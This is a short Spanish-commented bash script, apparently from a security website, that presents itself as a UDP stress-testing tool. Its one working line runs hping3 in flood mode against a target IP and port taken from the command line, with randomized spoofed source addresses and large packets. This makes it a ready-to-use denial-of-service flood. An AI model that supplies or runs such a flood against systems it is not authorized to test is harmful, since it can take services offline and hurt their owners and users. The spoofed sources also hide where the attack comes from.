# !/bin/bash
# Herramienta de test de stress UDP
# (C) hackingyseguridad.com 2017
echo UDP Flood con herramienta hping3
echo "uso: ./udpflood2.sh IP Puerto_UDP"
echo "Control + C para interrumpir"
hping3 $1 -2 --rand-source -p $2 --flood -d 1440
